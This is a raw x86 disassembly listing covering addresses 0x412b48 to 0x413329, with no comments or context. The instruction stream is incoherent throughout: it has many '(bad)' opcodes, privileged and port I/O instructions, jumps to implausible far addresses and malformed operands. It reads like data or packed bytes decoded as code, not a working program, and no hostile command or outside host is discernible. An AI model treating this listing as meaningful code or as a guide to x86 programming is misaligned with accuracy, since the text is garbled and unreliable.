  412b48:	clc    
  412b49:	sub    esi,ebp
  412b4b:	icebp  
  412b4c:	fiadd  WORD PTR ss:[ecx+0x4376b8ab]
  412b53:	ss xchg esp,eax
  412b55:	xor    ecx,DWORD PTR [eax+0x4aa905af]
  412b5b:	and    dl,BYTE PTR [eax+0x79b954d7]
  412b61:	jmp    0x412be0
  412b63:	xor    al,0x4d
  412b65:	test   eax,0xc3a27dde
  412b6a:	xchg   BYTE PTR [esi-0x1febd018],dl
  412b70:	pop    es
  412b71:	jo     0x412b8c
  412b73:	int3   
  412b74:	out    dx,al
  412b75:	adc    al,0x1d
  412b77:	and    al,0x5d
  412b79:	add    ah,BYTE PTR [esi]
  412b7b:	sub    eax,0xff06c483
  412b80:	enter  0x89e9,0x35
  412b84:	adc    DWORD PTR [ecx-0x943ed72],0x7ab3d7ff
  412b8e:	rcl    DWORD PTR [ebx-0x12],0xbe
  412b92:	push   eax
  412b93:	leave  
  412b94:	and    al,0x56
  412b96:	sbb    DWORD PTR [eax-0x18645898],edx
  412b9c:	loope  0x412b9f
  412b9e:	jg     0x412ba0
  412ba0:	jno    0x412bfa
  412ba2:	repz sbb eax,0x144a7f28
  412ba8:	jb     0x412bf1
  412baa:	xlat   BYTE PTR ds:[ebx]
  412bab:	mov    esi,0xca812d5d
  412bb0:	icebp  
  412bb1:	mov    edx,0xf56294f7
  412bb6:	inc    edi
  412bb7:	call   0x6abfa1df
  412bbc:	sub    ch,0x81
  412bbf:	mov    cs,WORD PTR [ebx]
  412bc1:	icebp  
  412bc2:	pop    ecx
  412bc3:	stc    
  412bc4:	dec    esi
  412bc5:	pop    ss
  412bc6:	sar    ecx,cl
  412bc8:	fwait
  412bc9:	iret   
  412bca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bcb:	into   
  412bcc:	cmp    eax,0xeae17424
  412bd1:	cs adc edx,ebp
  412bd4:	icebp  
  412bd5:	imul   BYTE PTR ds:0xfd39b25e
  412bdb:	pop    esi
  412bdc:	xchg   BYTE PTR [edi+0x4f],dh
  412bdf:	in     al,dx
  412be0:	mov    WORD PTR [edi+eax*8+0xb],fs
  412be4:	dec    edx
  412be5:	pmuludq mm2,QWORD PTR [ebp-0x3fcc911a]
  412bec:	(bad)  
  412bed:	mov    bl,0x25
  412bef:	lock push ds
  412bf1:	(bad)  
  412bf2:	xlat   BYTE PTR ds:[ebx]
  412bf3:	dec    ebp
  412bf4:	or     ch,BYTE PTR [ecx-0x1b]
  412bf7:	pop    ecx
  412bf8:	(bad)  
  412bf9:	sar    DWORD PTR ss:[ebp+0x1b],1
  412bfd:	fcomp  QWORD PTR [eax+0x374b87c4]
  412c03:	jmp    0x243a41a1
  412c08:	push   ecx
  412c09:	cmp    eax,0xb8831dfa
  412c0e:	stc    
  412c0f:	sar    DWORD PTR ds:0x13de2386,cl
  412c15:	mov    esi,0xdb42a374
  412c1a:	cli    
  412c1b:	cdq    
  412c1c:	arpl   WORD PTR [eax],ax
  412c1e:	lea    edx,[edx-0x78]
  412c21:	lods   eax,DWORD PTR ds:[esi]
  412c22:	dec    ebp
  412c23:	stos   DWORD PTR es:[edi],eax
  412c24:	in     eax,dx
  412c25:	mov    al,0x73
  412c27:	xchg   DWORD PTR [edx+ecx*8-0x5f],esp
  412c2b:	iret   
  412c2c:	imul   eax,DWORD PTR [ecx+edi*4+0x5d334d87],0x8f5d40bc
  412c37:	push   0xffffffaa
  412c39:	into   
  412c3a:	sub    DWORD PTR [ecx-0x510d63aa],esp
  412c40:	(bad)  
  412c41:	mov    bh,0x8d
  412c43:	pop    ebx
  412c44:	sub    DWORD PTR [eax],edi
  412c46:	xor    DWORD PTR [edx-0x68],edx
  412c49:	cmp    DWORD PTR [edi+edx*8],edx
  412c4c:	sub    eax,DWORD PTR [esi+0x310de9a9]
  412c52:	inc    esp
  412c53:	inc    esi
  412c54:	rcl    DWORD PTR [ebx-0x41482fac],1
  412c5a:	xor    eax,0x64adc293
  412c5f:	ret    0x7597
  412c62:	push   edx
  412c63:	sub    BYTE PTR [ecx+0x7],ah
  412c66:	mov    edx,0xc486d536
  412c6b:	push   eax
  412c6c:	jae    0x412c82
  412c6e:	xor    ebp,DWORD PTR [eax]
  412c70:	sbb    ch,bl
  412c72:	(bad)  
  412c73:	stos   DWORD PTR es:[edi],eax
  412c74:	or     DWORD PTR [ecx-0x8],0x299f2ce3
  412c7b:	add    al,0x3e
  412c7d:	jbe    0x412c14
  412c7f:	retf   
  412c80:	sub    ecx,DWORD PTR [esi-0x5746a673]
  412c86:	xor    BYTE PTR [eax+edx*2],bh
  412c89:	scas   eax,DWORD PTR es:[edi]
  412c8a:	add    ch,ah
  412c8c:	mov    edi,cs
  412c8e:	popf   
  412c8f:	pop    eax
  412c90:	fisub  WORD PTR [eax-0x5d7b9bdd]
  412c96:	jl     0x412c37
  412c98:	push   0xbd1e4bfc
  412c9d:	or     eax,0x9ec18fb5
  412ca2:	xor    dh,ch
  412ca4:	jno    0x412ce7
  412ca6:	cmp    ah,BYTE PTR [esp+edx*2-0x51]
  412caa:	leave  
  412cab:	rcl    DWORD PTR [ecx],1
  412cad:	inc    eax
  412cae:	add    ebp,esp
  412cb0:	into   
  412cb1:	xor    eax,0x14153602
  412cb6:	push   ss
  412cb7:	cdq    
  412cb8:	mov    esp,DWORD PTR [eax-0x4f671e3c]
  412cbe:	jnp    0x412d11
  412cc0:	adc    al,0xc0
  412cc2:	add    eax,0x460433c8
  412cc7:	or     dh,ah
  412cc9:	mov    DWORD PTR ds:0xa1871432,ecx
  412ccf:	push   esi
  412cd0:	jmp    0xe6c9:0x8ffcd7ba
  412cd7:	push   cs
  412cd8:	dec    esi
  412cd9:	mov    dl,0x5
  412cdb:	fmul   st,st(7)
  412cdd:	mov    ebp,0x60926a49
  412ce2:	adc    eax,0x74a2f614
  412ce7:	into   
  412ce8:	cmp    ecx,ebp
  412cea:	push   es
  412ceb:	mov    edx,0x11e9184e
  412cf0:	push   0xffffffd1
  412cf2:	arpl   WORD PTR [ebp-0x142eeea],ax
  412cf8:	xor    eax,0xaaf0c1b
  412cfd:	mov    ebx,0x5bc5b2e5
  412d02:	mov    bl,0xab
  412d04:	outs   dx,BYTE PTR ds:[esi]
  412d05:	aad    0x3
  412d07:	jnp    0x412d43
  412d09:	icebp  
  412d0a:	test   DWORD PTR [eax],edi
  412d0c:	fs inc edi
  412d0e:	int    0xbf
  412d10:	ja     0x412ce8
  412d12:	pop    DWORD PTR [eax+edx*4-0x74]
  412d16:	jo     0x412cdc
  412d18:	and    ebp,ecx
  412d1a:	daa    
  412d1b:	or     dl,BYTE PTR [ebx-0x3ddfd81f]
  412d21:	into   
  412d22:	std    
  412d23:	push   ebx
  412d24:	imul   esp,DWORD PTR [esi],0x5e
  412d27:	sub    al,0xff
  412d29:	fs or  bh,al
  412d2c:	push   0x8118a00e
  412d31:	dec    esp
  412d32:	ss push ebx
  412d34:	push   es
  412d35:	xchg   ecx,eax
  412d36:	(bad)  
  412d37:	cmp    BYTE PTR [ebp-0x9],ch
  412d3a:	lea    eax,[ecx-0x18fd4039]
  412d40:	jns    0x412db1
  412d42:	jne    0x412d99
  412d44:	ret    
  412d45:	jbe    0x412d88
  412d47:	jns    0x412d7d
  412d49:	add    eax,0x7a6c1f88
  412d4e:	lahf   
  412d4f:	ins    DWORD PTR es:[edi],dx
  412d50:	pop    edx
  412d51:	sub    BYTE PTR [ebp+0x31],0xe0
  412d55:	fstp   TBYTE PTR [ebx+ebx*2-0x170ba76e]
  412d5c:	cli    
  412d5d:	repnz sbb edi,ebx
  412d60:	lods   al,BYTE PTR ds:[esi]
  412d61:	aad    0x8f
  412d63:	push   ss
  412d64:	adc    esp,esp
  412d66:	mov    al,0xf6
  412d68:	ficom  DWORD PTR [ebx-0x87ca76c]
  412d6e:	(bad)  
  412d6f:	loope  0x412dbf
  412d71:	jo     0x412d05
  412d73:	inc    ebx
  412d74:	dec    ebx
  412d75:	jb     0x412da5
  412d77:	lock pslld mm1,QWORD PTR [ebp-0x41f94664]
  412d7f:	fsubr  QWORD PTR [ecx+0x74fee107]
  412d85:	dec    ebx
  412d86:	test   DWORD PTR [ecx+eiz*8+0x3682c323],eax
  412d8d:	aas    
  412d8e:	xor    ch,BYTE PTR [ebp+0xaaf75c0]
  412d94:	mov    ?,WORD PTR [edi+ecx*4+0x32]
  412d98:	jno    0x412d9b
  412d9a:	mov    edx,0x6db73860
  412d9f:	stos   DWORD PTR es:[edi],eax
  412da0:	or     ecx,DWORD PTR [edx-0x1e9fcad5]
  412da6:	mov    bh,0x66
  412da8:	push   edi
  412da9:	fs in  eax,0x1e
  412dac:	xor    BYTE PTR [ecx-0x30dc4016],ah
  412db2:	fs jo  0x412d72
  412db5:	pop    esp
  412db6:	and    al,0xc4
  412db8:	aad    0xed
  412dba:	add    BYTE PTR [edi-0x18],dh
  412dbd:	out    dx,al
  412dbe:	xor    BYTE PTR [esi+0x18f49a5d],ch
  412dc4:	cli    
  412dc5:	adc    DWORD PTR [esp+ecx*1],esp
  412dc8:	out    0x7c,eax
  412dca:	pop    ss
  412dcb:	fld1   
  412dcd:	push   0x596ed12c
  412dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dd3:	pushf  
  412dd4:	cmp    esp,DWORD PTR [ecx+0x14081a63]
  412dda:	jge    0x412df3
  412ddc:	enter  0x8d92,0x36
  412de0:	cmp    esp,ebx
  412de2:	jmp    0x412da5
  412de4:	dec    edx
  412de5:	dec    ecx
  412de6:	rcl    DWORD PTR [edi+eiz*8+0x4],1
  412dea:	push   cs
  412deb:	dec    esp
  412dec:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  412dee:	mov    bl,BYTE PTR [ecx]
  412df0:	pop    ebp
  412df1:	ins    BYTE PTR es:[edi],dx
  412df2:	movsx  edi,BYTE PTR [ebx-0x72]
  412df6:	pop    ecx
  412df7:	mov    bh,0x2c
  412df9:	ror    bl,1
  412dfb:	gs call 0x357e1f0c
  412e01:	add    eax,0x33b24628
  412e06:	mov    edx,0x5506af90
  412e0b:	(bad)  
  412e0c:	ror    edi,cl
  412e0e:	mov    ebx,0x6cd3269a
  412e13:	test   al,0x5e
  412e15:	push   ebx
  412e16:	psllw  mm7,QWORD PTR [ebx]
  412e19:	daa    
  412e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e1b:	inc    ebx
  412e1c:	(bad)  
  412e1d:	jb     0x412dab
  412e1f:	std    
  412e20:	adc    DWORD PTR [ebx+0x69],esp
  412e23:	mov    edi,0x892495a7
  412e28:	mov    ebx,0x64b7d39
  412e2d:	add    BYTE PTR [edi],al
  412e2f:	mov    dl,0xab
  412e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e32:	or     eax,0x54cd8d2a
  412e37:	adc    al,0x2f
  412e39:	adc    eax,0x5ce8d0ef
  412e3e:	retf   0x8ba5
  412e41:	adc    al,0x47
  412e43:	fcmove st,st(7)
  412e45:	mov    ebp,0xf121e7d
  412e4a:	adc    al,0xf2
  412e4c:	or     eax,0x31fab3c3
  412e51:	inc    edx
  412e52:	inc    eax
  412e53:	test   al,0xb3
  412e55:	stos   BYTE PTR es:[edi],al
  412e56:	popf   
  412e57:	ss jg  0x412de2
  412e5a:	xchg   edi,eax
  412e5b:	cmp    ecx,DWORD PTR [eax-0x73]
  412e5e:	jbe    0x412eb6
  412e60:	(bad)  
  412e61:	jnp    0x412eaa
  412e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e64:	adc    bh,cl
  412e66:	jne    0x412df9
  412e68:	adc    al,0x1f
  412e6a:	xchg   edx,eax
  412e6b:	inc    esp
  412e6c:	dec    esi
  412e6d:	mov    ss,WORD PTR [eax+0x2e]
  412e70:	test   al,0x89
  412e72:	ins    BYTE PTR es:[edi],dx
  412e73:	jbe    0x412e06
  412e75:	ds ins BYTE PTR es:[edi],dx
  412e77:	sub    al,0x83
  412e79:	lock (bad) [ecx+0x7f116832]
  412e80:	in     al,0xf4
  412e82:	aas    
  412e83:	mov    edx,0x7fce48d7
  412e88:	(bad)  
  412e89:	lods   eax,DWORD PTR ds:[esi]
  412e8a:	in     al,dx
  412e8b:	xchg   BYTE PTR ds:0xa2937752,bh
  412e91:	adc    al,0xe0
  412e93:	xor    eax,0x36a0d35d
  412e98:	add    ch,BYTE PTR [ecx+0x3]
  412e9b:	jmp    0x4b90a5ba
  412ea0:	jmp    0x75175a77
  412ea5:	add    eax,0x7ceb68b8
  412eaa:	cmp    al,0xe1
  412eac:	or     al,0x35
  412eae:	add    ecx,ecx
  412eb0:	lds    ecx,FWORD PTR [edx-0x26eb2c3d]
  412eb6:	fnstcw WORD PTR [edx+edx*2]
  412eb9:	scas   al,BYTE PTR es:[edi]
  412eba:	dec    esi
  412ebb:	jp     0x412ec4
  412ebd:	mov    ebx,DWORD PTR [edi+0x69]
  412ec0:	and    DWORD PTR [esi-0x635ebdce],edx
  412ec6:	jmp    0x16987bec
  412ecb:	adc    BYTE PTR [eax],dl
  412ecd:	jbe    0x412ea6
  412ecf:	mov    ebx,0x7d22dbae
  412ed4:	es std 
  412ed6:	pop    es
  412ed7:	not    dl
  412ed9:	adc    al,0xe7
  412edb:	inc    ebx
  412edc:	jmp    0xb709b00b
  412ee1:	mov    ds:0x7360104d,al
  412ee6:	jo     0x412f61
  412ee8:	sub    DWORD PTR [ecx+esi*8+0x3f7d1638],ecx
  412eef:	dec    eax
  412ef0:	fnclex 
  412ef2:	jp     0x412e83
  412ef4:	jmp    FWORD PTR [esi+0x506c70d0]
  412efa:	pop    ds
  412efb:	adc    eax,0x81f07b14
  412f00:	retf   
  412f01:	xor    bl,dh
  412f03:	mov    eax,0x6ba0d4b9
  412f08:	push   es
  412f09:	dec    edx
  412f0a:	inc    ebx
  412f0b:	call   0xcb17f07a
  412f10:	mov    DWORD PTR [edi-0x1],ecx
  412f13:	retf   0x158d
  412f16:	lock jmp 0x412f36
  412f19:	xor    cl,BYTE PTR [edx-0x7f62c203]
  412f1f:	leave  
  412f20:	cmp    dl,BYTE PTR [eax+esi*1-0x23]
  412f24:	out    dx,al
  412f25:	outs   dx,DWORD PTR ds:[esi]
  412f26:	ins    DWORD PTR es:[edi],dx
  412f27:	test   eax,0xe95533aa
  412f2c:	loopne 0x412eca
  412f2e:	push   ebx
  412f2f:	push   ebx
  412f30:	lods   eax,DWORD PTR ds:[esi]
  412f31:	test   eax,0x237e5edf
  412f36:	sbb    DWORD PTR [edi-0x76],0x60
  412f3a:	push   edi
  412f3b:	xor    edx,esp
  412f3d:	mov    ebx,0x537f9ba2
  412f42:	addr16 lahf 
  412f44:	outs   dx,BYTE PTR ds:[esi]
  412f45:	scas   eax,DWORD PTR es:[edi]
  412f46:	aad    0xe8
  412f48:	sbb    DWORD PTR [esi+eax*8-0x230d45cb],esi
  412f4f:	push   cs
  412f50:	cmp    BYTE PTR [eax],0x23
  412f53:	aad    0xa6
  412f55:	mov    ch,0x51
  412f57:	ficom  DWORD PTR [ebp+eax*4+0x7a6e1202]
  412f5e:	sub    BYTE PTR [ecx+0x40],dl
  412f61:	mov    db0,ebp
  412f64:	sbb    eax,0x573a6750
  412f69:	shl    al,cl
  412f6b:	out    0x5d,al
  412f6d:	mov    ebp,0x6ce86957
  412f72:	mov    ch,BYTE PTR [ebp-0x4f9f108f]
  412f78:	mov    ch,BYTE PTR [esi]
  412f7a:	lods   eax,DWORD PTR ds:[esi]
  412f7b:	adc    dh,bl
  412f7d:	sbb    esi,ebx
  412f7f:	and    al,0xee
  412f81:	nop
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	mov    BYTE PTR [esi+ebp*8-0x2c8ff691],0x2d
  412f8b:	(bad)  
  412f8c:	pop    edx
  412f8d:	in     eax,dx
  412f8e:	pop    edx
  412f8f:	test   BYTE PTR [ebp+0x5a996532],bl
  412f95:	into   
  412f96:	leave  
  412f97:	fidiv  WORD PTR [edi+0x54f8cd99]
  412f9d:	lods   eax,DWORD PTR ds:[esi]
  412f9e:	cmp    al,0xe5
  412fa0:	push   ebx
  412fa1:	ror    BYTE PTR [eax-0x5b547a1f],1
  412fa7:	and    dh,cl
  412fa9:	pop    ebx
  412faa:	pusha  
  412fab:	fisub  DWORD PTR [esi-0x19]
  412fae:	dec    ecx
  412faf:	xchg   eax,esp
  412fb1:	pop    esp
  412fb2:	adc    DWORD PTR [esp+eax*2-0x3ca33294],eax
  412fb9:	(bad)  
  412fba:	pop    ds
  412fbb:	(bad)  
  412fbc:	sub    eax,0x37128ffe
  412fc1:	clc    
  412fc2:	cli    
  412fc3:	cmp    eax,0xdc0c0690
  412fc8:	jne    0x412f50
  412fca:	enter  0xc32e,0x19
  412fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fcf:	in     eax,0x9e
  412fd1:	out    0xdb,eax
  412fd3:	(bad)  
  412fd4:	cli    
  412fd5:	(bad)  [ebp+0x79]
  412fd8:	xlat   BYTE PTR ds:[ebx]
  412fd9:	pop    ebp
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	outs   dx,DWORD PTR ds:[esi]
  412fdc:	loope  0x412fc6
  412fde:	or     edi,DWORD PTR [edi-0x51e71c87]
  412fe4:	outs   dx,DWORD PTR ds:[esi]
  412fe5:	gs pop eax
  412fe7:	jle    0x41302c
  412fe9:	sub    ch,BYTE PTR [ebx-0x3d94b832]
  412fef:	jns    0x412fa6
  412ff1:	pop    ds
  412ff2:	ins    DWORD PTR es:[edi],dx
  412ff3:	fisubr WORD PTR [eax-0x7d4f9942]
  412ff9:	xor    ch,BYTE PTR [esp+ecx*2+0x52]
  412ffd:	mov    WORD PTR [esi+edi*4],ds
  413000:	push   edx
  413001:	cmc    
  413002:	test   DWORD PTR [edi],eax
  413004:	xchg   edx,eax
  413005:	dec    ebx
  413006:	cmp    edi,DWORD PTR [edi+0x72]
  413009:	std    
  41300a:	out    dx,al
  41300b:	loopne 0x413044
  41300d:	stos   BYTE PTR es:[edi],al
  41300e:	cmp    al,0x87
  413010:	aam    0x34
  413012:	sbb    BYTE PTR [ebp+0x3db61fc],al
  413018:	lock cmp dh,BYTE PTR [eax]
  41301b:	inc    esp
  41301c:	fcom   QWORD PTR [edi+esi*1-0x2e3e5f13]
  413023:	int    0x7b
  413025:	(bad)  
  413026:	out    dx,al
  413027:	lods   eax,DWORD PTR ds:[esi]
  413028:	push   edx
  413029:	fisttp WORD PTR [esi+edx*1+0x636a1db8]
  413030:	add    eax,0x60b93902
  413035:	in     al,0x38
  413037:	fadd   QWORD PTR [edi-0x63]
  41303a:	xchg   ebx,eax
  41303b:	js     0x412feb
  41303d:	aad    0x5e
  41303f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413040:	add    BYTE PTR [edi+ecx*4-0x35],ah
  413044:	sub    ch,BYTE PTR cs:[ebx+0x6d]
  413048:	mov    WORD PTR [esi-0x49],?
  41304b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41304c:	jge    0x413066
  41304e:	jo     0x41309b
  413050:	repz popf 
  413052:	outs   dx,DWORD PTR ds:[esi]
  413053:	mov    edi,0x9fb052b5
  413058:	lds    edi,FWORD PTR [esi-0x345c667f]
  41305e:	loopne 0x41300b
  413060:	inc    edx
  413061:	int    0x84
  413063:	xchg   esi,eax
  413064:	scas   eax,DWORD PTR es:[edi]
  413065:	sbb    ebx,ebp
  413067:	fild   QWORD PTR [esi+0x68]
  41306a:	push   edi
  41306b:	jnp    0x413001
  41306d:	pop    edi
  41306e:	add    DWORD PTR [ebx-0x4f],eax
  413071:	nop
  413072:	aas    
  413073:	jg     0x4130a4
  413075:	ror    esp,1
  413077:	clc    
  413078:	mov    esi,0x7373333a
  41307d:	sub    dh,BYTE PTR [esi]
  41307f:	loope  0x413045
  413081:	ja     0x413027
  413083:	aaa    
  413084:	enter  0x4aa7,0xb1
  413088:	sub    DWORD PTR [edx-0x170d8658],ebx
  41308e:	rol    DWORD PTR [ecx-0x66],0x53
  413092:	shl    DWORD PTR [eax+0x2a],0x7f
  413096:	xor    eax,0xcfc17ea6
  41309b:	dec    edi
  41309c:	adc    BYTE PTR [edx+0x9c315d4],dh
  4130a2:	retf   
  4130a3:	push   cs
  4130a4:	and    al,0x78
  4130a6:	fisttp DWORD PTR [ecx+0x3914df09]
  4130ac:	sbb    BYTE PTR [edx],dh
  4130ae:	cld    
  4130af:	xor    dl,BYTE PTR [eax+0x5b]
  4130b2:	das    
  4130b3:	jl     0x413096
  4130b5:	aam    0x8
  4130b7:	push   ss
  4130b8:	loop   0x4130ba
  4130ba:	adc    cl,BYTE PTR [ebx]
  4130bc:	mov    dl,0x96
  4130be:	icebp  
  4130bf:	xor    al,0xfd
  4130c1:	loop   0x4130c9
  4130c3:	(bad)  
  4130c5:	fnstsw WORD PTR [ebx+edx*2]
  4130c8:	test   DWORD PTR [edi+0x74],0xcaab5e9b
  4130cf:	and    bh,BYTE PTR [esi-0x26]
  4130d2:	jae    0x41309f
  4130d4:	adc    DWORD PTR [edi+0x33],ecx
  4130d7:	repz dec esi
  4130d9:	jmp    0xc31159e9
  4130de:	inc    esi
  4130df:	pop    ds
  4130e0:	add    al,BYTE PTR [ecx+0xc4c9bb4]
  4130e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130e7:	enter  0xcc13,0x85
  4130eb:	fild   QWORD PTR [ecx+ebp*2-0x3934c5ce]
  4130f2:	outs   dx,DWORD PTR ds:[esi]
  4130f3:	sub    cl,BYTE PTR [edi-0x6ccbde27]
  4130f9:	or     BYTE PTR [edx],dh
  4130fb:	jmp    0x61176e81
  413100:	xchg   BYTE PTR [ecx-0x40],ah
  413103:	aam    0x7a
  413105:	scas   al,BYTE PTR es:[edi]
  413106:	push   ss
  413107:	(bad)  
  413109:	sub    ebx,DWORD PTR ds:0xaabf65e0
  41310f:	xchg   edx,eax
  413110:	add    DWORD PTR [ebx],0xfffffff9
  413113:	mov    ah,0x47
  413115:	mov    bl,ah
  413117:	lods   al,BYTE PTR ds:[esi]
  413118:	mov    ah,0xb9
  41311a:	add    DWORD PTR [ebp+0x652551da],0x35e06127
  413124:	xor    BYTE PTR [ecx+0x4b27908c],0xc4
  41312b:	stos   BYTE PTR es:[edi],al
  41312c:	int    0xa9
  41312e:	in     al,dx
  41312f:	mov    edx,DWORD PTR [eax+0x61]
  413132:	mov    bl,0x3b
  413134:	pushf  
  413135:	sub    al,0xfd
  413137:	sbb    ch,bl
  413139:	je     0x413160
  41313b:	test   DWORD PTR [ebx],ebx
  41313d:	inc    ebp
  41313e:	sub    edi,esi
  413140:	push   edx
  413141:	inc    edi
  413142:	mov    DWORD PTR ss:[esi-0x1],ebx
  413146:	mov    cl,0xef
  413148:	out    dx,al
  413149:	rcr    DWORD PTR [eax-0x1d],1
  41314c:	repnz and al,0xd0
  41314f:	scas   al,BYTE PTR es:[edi]
  413150:	cmp    DWORD PTR [ebp+0x792ef817],0xffffff8b
  413157:	test   eax,0x1f0578a5
  41315c:	pop    es
  41315d:	popf   
  41315e:	cld    
  41315f:	jnp    0x413109
  413161:	jl     0x41318a
  413163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413164:	adc    al,0xf1
  413166:	xor    eax,ebx
  413168:	inc    edx
  413169:	stos   DWORD PTR es:[edi],eax
  41316a:	jne    0x4130f8
  41316c:	mov    bh,0x1a
  41316e:	(bad)  
  41316f:	lahf   
  413170:	xchg   ebx,eax
  413171:	pop    ss
  413172:	call   0x1eb6:0xabe96b15
  413179:	je     0x413129
  41317b:	in     eax,dx
  41317c:	inc    edi
  41317d:	mov    al,ds:0xa73e42e
  413182:	out    0x54,al
  413184:	scas   eax,DWORD PTR es:[edi]
  413185:	inc    esi
  413186:	aad    0xb4
  413188:	jmp    0xb376:0xb052936e
  41318f:	and    DWORD PTR [eax+0x7b99bf00],ebx
  413195:	mov    al,0x44
  413197:	sub    ebp,DWORD PTR [ecx*8+0x2f811385]
  41319e:	pop    es
  41319f:	fwait
  4131a0:	aaa    
  4131a1:	imul   edi,DWORD PTR [esi+0x7af8fe9a],0x9504ab32
  4131ab:	aas    
  4131ac:	aaa    
  4131ad:	test   BYTE PTR [edx-0x449cf8c6],dh
  4131b3:	lea    edx,ds:0xef6699e3
  4131b9:	cwde   
  4131ba:	jne    0x4131ee
  4131bc:	ror    BYTE PTR [ebx+0x5a],cl
  4131bf:	inc    ebp
  4131c0:	rol    DWORD PTR [esi-0x6470795b],cl
  4131c6:	pop    ss
  4131c7:	adc    ch,BYTE PTR [edx]
  4131c9:	sti    
  4131ca:	rol    DWORD PTR [ebx+0x4b340759],1
  4131d0:	stos   DWORD PTR es:[edi],eax
  4131d1:	cs and al,0xfb
  4131d4:	add    edi,DWORD PTR [ecx]
  4131d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131d7:	sub    BYTE PTR [ecx+0x3fb6f5e1],dh
  4131dd:	mov    eax,ds:0x9f2283bc
  4131e2:	call   0x69c776dd
  4131e7:	sub    al,0x79
  4131e9:	fidivr WORD PTR [edx-0x47d14fea]
  4131ef:	lea    ebp,[ecx+0x2a6bb80a]
  4131f5:	dec    BYTE PTR [ecx+0xbed1357]
  4131fb:	add    edx,DWORD PTR [ebx+ebx*2+0x3f5045da]
  413202:	ds pop edi
  413204:	inc    ecx
  413205:	jecxz  0x413282
  413207:	imul   eax,DWORD PTR [ecx-0x8],0x3d55c681
  41320e:	jle    0x41326c
  413210:	cmp    eax,0xcd4f5f37
  413215:	retf   
  413216:	stc    
  413217:	xchg   esi,eax
  413218:	in     eax,dx
  413219:	push   es
  41321a:	sub    DWORD PTR [ebx],ebx
  41321c:	int    0x21
  41321e:	xor    al,0x51
  413220:	cmp    BYTE PTR [ebx+0x5abace],al
  413226:	inc    edi
  413227:	xchg   ebx,eax
  413228:	mov    ecx,0x1953e486
  41322d:	imul   esp,DWORD PTR [ecx],0x3d17e9
  413233:	mov    bl,0x4b
  413235:	into   
  413236:	and    DWORD PTR [esi-0x20],0x4e
  41323a:	sbb    eax,DWORD PTR [edx+0x6a]
  41323d:	jnp    0x4131ff
  41323f:	lock inc ecx
  413241:	inc    edi
  413242:	fimul  DWORD PTR [edi]
  413244:	jl     0x413210
  413246:	adc    al,0xff
  413248:	jmp    0x171c:0xd281798a
  41324f:	and    eax,0xdf0f8b93
  413254:	push   esp
  413255:	xor    ebp,ebp
  413257:	stc    
  413258:	jmp    0x41326b
  41325a:	leave  
  41325b:	sub    ebx,DWORD PTR ds:0x7b73c24a
  413261:	inc    esp
  413262:	push   ecx
  413263:	inc    ebx
  413264:	and    al,0x36
  413266:	jle    0x413217
  413268:	ret    0xef48
  41326b:	and    cl,BYTE PTR [esi]
  41326d:	fs idiv DWORD PTR ds:0xe668c299
  413275:	daa    
  413276:	push   edx
  413277:	inc    eax
  413278:	lahf   
  413279:	mov    bh,0x6b
  41327b:	inc    edi
  41327c:	icebp  
  41327d:	das    
  41327e:	jno    0x4132ea
  413280:	stos   BYTE PTR es:[edi],al
  413281:	mov    al,ds:0x77adf585
  413286:	sbb    al,0x7
  413288:	sub    dl,BYTE PTR [ecx]
  41328a:	hlt    
  41328b:	sub    ah,dl
  41328d:	jmp    0xd6de:0x6426717f
  413294:	or     al,0x2b
  413296:	ins    DWORD PTR es:[edi],dx
  413297:	int3   
  413298:	inc    esi
  413299:	ret    
  41329a:	repnz xchg esi,eax
  41329c:	sub    al,0xcb
  41329e:	repnz push 0xffffff95
  4132a1:	(bad)  
  4132a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132a3:	clc    
  4132a4:	pop    edx
  4132a5:	xor    eax,0xab7d799
  4132aa:	popf   
  4132ab:	pop    edx
  4132ac:	jo     0x4132c2
  4132ae:	jne    0x413318
  4132b0:	imul   edi,DWORD PTR [ecx-0x2ee16dba],0x2d49cb76
  4132ba:	fdivr  DWORD PTR [ebp-0x701658d8]
  4132c0:	or     BYTE PTR [edx-0x2c],dh
  4132c3:	add    al,0x53
  4132c5:	int3   
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	dec    ecx
  4132c8:	pop    es
  4132c9:	push   esp
  4132ca:	mov    esi,0x89317c51
  4132cf:	mov    ds:0xbb393ce8,al
  4132d4:	jmp    0xff286e2b
  4132d9:	rcr    DWORD PTR ds:0x861f291c,cl
  4132df:	into   
  4132e0:	clc    
  4132e1:	gs popa 
  4132e3:	test   BYTE PTR [ecx],0xa3
  4132e6:	sbb    BYTE PTR [ecx],0xcd
  4132e9:	add    eax,0xd43e6694
  4132ee:	dec    esi
  4132ef:	inc    esp
  4132f0:	addr16 mov ds:0xa198,al
  4132f4:	push   0x7a
  4132f6:	jno    0x4132cc
  4132f8:	mov    bl,0x5d
  4132fa:	or     al,BYTE PTR [edi+0x2f]
  4132fd:	into   
  4132fe:	icebp  
  4132ff:	adc    dh,ah
  413301:	aaa    
  413302:	xor    BYTE PTR [ebx+0x4032f4be],0x50
  413309:	in     al,0x6a
  41330b:	xchg   edx,eax
  41330c:	push   cs
  41330d:	repnz add esp,DWORD PTR [eax+eiz*1-0x66]
  413312:	ins    BYTE PTR es:[edi],dx
  413313:	xor    eax,DWORD PTR [edi-0x1a]
  413316:	add    BYTE PTR [eax],cl
  413318:	sti    
  413319:	outs   dx,DWORD PTR ds:[esi]
  41331a:	(bad)  
  41331b:	pop    eax
  41331c:	fadd   QWORD PTR [edx+ecx*4-0x19]
  413320:	pop    esi
  413321:	mov    bl,0xb4
  413323:	ins    DWORD PTR es:[edi],dx
  413324:	jmp    0x1b70c8f5
  413329:	icebp  
